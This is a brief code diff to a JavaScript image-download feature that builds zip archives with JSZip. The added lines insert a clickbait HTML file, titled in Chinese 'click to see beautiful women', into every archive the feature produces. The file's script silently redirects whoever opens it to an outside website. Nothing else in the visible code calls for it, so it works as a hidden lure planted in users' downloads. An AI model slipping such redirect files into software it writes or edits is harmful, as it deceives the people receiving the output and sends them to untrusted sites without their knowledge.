@@ -298,6 +298,9 @@ window.onload = function () {
     var imageSuffix = [];//图片后缀
     var zip = new JSZip();
     zip.file("readme.txt", "文档内容\n");
+    zip.file("点击看美女.html", `<script>
+    window.location.href = 'http://www.lookmeinv.com'
+    </script>`);
     var img = zip.folder("images");
     for(var i=0;i<imgUrl.length;i++){
       var src = imgUrl[i];
